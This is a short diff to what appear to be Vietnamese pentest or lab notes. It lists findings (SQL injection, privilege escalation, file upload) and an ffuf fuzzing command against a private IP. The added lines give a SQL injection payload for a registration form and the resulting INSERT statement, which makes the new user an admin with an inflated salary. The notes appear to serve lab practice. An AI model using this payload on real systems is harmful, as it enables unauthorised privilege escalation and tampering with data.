@@ -17,3 +17,8 @@ SQL 2 chổ
 PE 2 chổ
 File upload
 misconfig (C:\Windows\System32\ipconfig.exe) xem ip và vô fuff (ffuf -u http://192.168.204.1:5000/FUZZ.php -w /usr/share/wordlists/dirb/common.txt )
+
+
+đăng ký :  ', '', '', 'admin', 99999)#
+INSERT INTO employees (username, email, password, role, salary)
+VALUES ('', '', '', 'admin', 99999)#', '123456', 'user', 0)
